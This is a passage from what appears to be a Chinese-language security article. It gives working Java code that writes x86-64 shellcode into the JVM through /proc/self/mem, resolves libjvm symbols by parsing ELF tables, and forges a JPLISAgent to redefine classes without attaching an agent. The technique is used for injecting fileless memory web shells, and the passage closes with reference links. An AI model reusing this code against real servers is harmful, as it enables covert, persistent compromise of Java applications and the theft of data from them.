        Method redefineClazz = InstrumentationImpl.class.getMethod("redefineClasses", ClassDefinition[].class);
        redefineClazz.invoke(this.inst, new Object[]{new ClassDefinition[]{definition}});
    }

    private InstrumentationImpl getInstrumentationImpl(){
        try {
            Class<?> instClazz = Class.forName("sun.instrument.InstrumentationImpl");
            Constructor<?> constructor = instClazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
            constructor.setAccessible(true);
            return (InstrumentationImpl)constructor.newInstance(getJPLISAgentPointer(), true, false);
        }catch (Exception e){
            return null;
        }
    }

    private long getJPLISAgentPointer() throws Exception {
        long randomAccessFileLength = 0, JNIGetCreatedJavaVMs = 0;
        FileReader fin  = new FileReader("/proc/self/maps");
        BufferedReader reader = new BufferedReader(fin);
        String line;
        while ((line = reader.readLine()) != null)
        {
            String[] splits = line.trim().split(" ");
            if(line.endsWith("libjava.so") && randomAccessFileLength == 0) {
                String[] addr_range = splits[0].split("-");
                long libbase = Long.parseLong(addr_range[0], 16);
                String elfpath = splits[splits.length - 1];
                randomAccessFileLength = getFunctionPointer(libbase,elfpath, "Java_java_io_RandomAccessFile_length");
            }else if(line.endsWith("libjvm.so") && JNIGetCreatedJavaVMs == 0) {
                String[] addr_range = splits[0].split("-");
                long libbase = Long.parseLong(addr_range[0], 16);
                String elfpath = splits[splits.length - 1];
                JNIGetCreatedJavaVMs = getFunctionPointer(libbase,elfpath, "JNI_GetCreatedJavaVMs" );
            }
            if(JNIGetCreatedJavaVMs != 0 && randomAccessFileLength != 0)
                break;
        }
        fin.close();
        if(randomAccessFileLength == 0 || JNIGetCreatedJavaVMs == 0){
            return 0;
        }
        byte[] shellCode = {
                (byte)0x55, (byte)0x48, (byte)0x89, (byte)0xe5, (byte)0x48, (byte)0x31, (byte)0xc0, (byte)0xb0, (byte)0x0f, (byte)0x48, (byte)0xf7, (byte)0xd0, (byte)0x48, (byte)0x21, (byte)0xc4,
                (byte)0x48, (byte)0xb8, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x83, (byte)0xEC, (byte)0x40, (byte)0x48,
                (byte)0x31, (byte)0xF6, (byte)0x48, (byte)0xFF, (byte)0xC6, (byte)0x48, (byte)0x8D, (byte)0x54, (byte)0x24, (byte)0x04, (byte)0x48, (byte)0x8D, (byte)0x7C, (byte)0x24, (byte)0x08,
                (byte)0xFF, (byte)0xD0, (byte)0x48, (byte)0x8B, (byte)0x7C, (byte)0x24, (byte)0x08, (byte)0x48, (byte)0x8D, (byte)0x74, (byte)0x24, (byte)0x10, (byte)0xBA, (byte)0x00, (byte)0x02,
                (byte)0x01, (byte)0x30, (byte)0x48, (byte)0x8B, (byte)0x07, (byte)0xFF, (byte)0x50, (byte)0x30, (byte)0x48, (byte)0x8B, (byte)0x44, (byte)0x24, (byte)0x10, (byte)0xC9, (byte)0xC3
        };
        byte[] stub = longToLittleEndianBytes(JNIGetCreatedJavaVMs,8);
        System.arraycopy(stub, 0, shellCode, 17, stub.length);
        RandomAccessFile fout = new RandomAccessFile("/proc/self/mem", "rw");
        byte[] backup = new byte[shellCode.length];
        fout.seek(randomAccessFileLength);
        fout.read(backup);
        fout.seek(randomAccessFileLength);
        fout.write(shellCode);
        fout.close();
        long jvmtiEnvPointer = fout.length(); //触发执行shellCode得到jvmtiEnv指针
        //恢复代码
        fout = new RandomAccessFile("/proc/self/mem", "rw");
        fout.seek(randomAccessFileLength);
        fout.write(backup);
        fout.close();
        long JPLISAgent = this.unsafe.allocateMemory(0x1000);
        this.unsafe.putLong(JPLISAgent + 8, jvmtiEnvPointer);
        this.unsafe.putByte(jvmtiEnvPointer+361,(byte) 2);
        return JPLISAgent;
    }

    private long getFunctionPointer(long baseAddress, String libraryName, String functionName) throws Exception {
        try (RandomAccessFile fin = new RandomAccessFile(libraryName, "r")){
            if(Integer.reverseBytes(fin.readInt()) != 1179403647){ //魔数校验
                return 0;
            }
            fin.seek(0x28);
            long e_shoff = Long.reverseBytes(fin.readLong()); //节区头表偏移量
            fin.seek(0x3a);
            short e_shentsize = Short.reverseBytes(fin.readShort()); //节区头表每个表项的大小
            fin.seek(0x3c);
            short e_shnum = Short.reverseBytes(fin.readShort()); //节区头表表项的数目
            long pshoff = e_shoff;
            long sh_offset = 0;
            long sh_size = 0;
            int sh_link = 0;
            long sh_entsize = 0;
            for (short i = 0; i < e_shnum; i++) { //遍历节区头表
                fin.seek(pshoff + 0x4);
                int sh_type = Integer.reverseBytes(fin.readInt()); //对应节的类型
                if(sh_type != SHT_DYNSYM) //判断对应节的类型是否是动态符号表
                {
                    pshoff += 64;
                    continue;
                }
                fin.seek(pshoff + 0x18);
                sh_offset = Long.reverseBytes(fin.readLong()); //动态符号表的偏移量
                fin.seek(pshoff + 0x20);
                sh_size = Long.reverseBytes(fin.readLong()); //动态符号表的大小
                fin.seek(pshoff + 0x28);
                sh_link = Integer.reverseBytes(fin.readInt()); //动态符号表使用的字符串所位于节区头表的下标索引
                fin.seek(pshoff + 0x38);
                sh_entsize = Long.reverseBytes(fin.readLong()); //动态符号表中每个条目的大小
                break;
            }
            long psymstr = sh_offset;
            long count = sh_size / sh_entsize; //动态符号表数组的长度
            long pshdr = e_shoff + ((long) sh_link * e_shentsize);//符号表字符串表项指针
            fin.seek(pshdr + 0x18);
            long shdr_sh_offset = Long.reverseBytes(fin.readLong()); //符号表字符串表的偏移量
            int st_name;
            byte st_info;
            long st_value;
            for (long i = 0; i < count; i++) {  //遍历动态符号表的条目
                fin.seek(psymstr);
                st_name = Integer.reverseBytes(fin.readInt()); //符号名称在符号表字符串表中的偏移量
                fin.seek(psymstr + 4);
                st_info = (byte)(fin.readByte() & 0x0f); //符号的类型
                fin.seek(psymstr + 8);
                st_value = Long.reverseBytes(fin.readLong()); //符号的偏移量
                if (st_name == 0 || st_value == 0 || (st_info != STT_FUNC && st_info != STT_GNU_IFUNC)) {
                    psymstr += sh_entsize;
                    continue;
                }
                fin.seek(shdr_sh_offset + st_name);
                StringBuilder name = new StringBuilder();
                byte ch;
                while((ch = fin.readByte()) != 0)
                {
                    name.append((char) ch);
                }
                if(name.toString().equals(functionName)){
                    return baseAddress + st_value;
                }
                psymstr += sh_entsize;
            }
        }
        return 0;
    }

    private Unsafe getUnsafe() {
        try{
            Field field = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
            field.setAccessible(true);
            return (Unsafe) field.get(null);
        }catch(Exception e){
            return null;
        }
    }
    private byte[] longToLittleEndianBytes(long value, int pointerLength) {
        byte[] bytes = new byte[pointerLength];
        for (int i = 0; i < 8; i++) {
            bytes[i] = (byte) (value >>> (i * 8));
        }
        return bytes;
    }
}
```

## 参考链接

<https://www.cnblogs.com/silyvin/articles/12178528.html>  
<https://xz.aliyun.com/t/10075>  
<https://xz.aliyun.com/t/11640>  
<https://github.com/BeichenDream/Kcon2021Code>  
<https://mp.weixin.qq.com/s?src=11&timestamp=1733121192&ver=5663&signature=Qko4tKIeue6vCsfKtgolxIJZEeJTACqSI91LVMk7pr*KH6UaBepheGZ0eus0hO5hEpeDxSC3TA53tsZD7CvTaUvvDQxJ1h0ZGHt29fHSMBp-mgYQCD2DSQl0W-tGicUU&new=1>
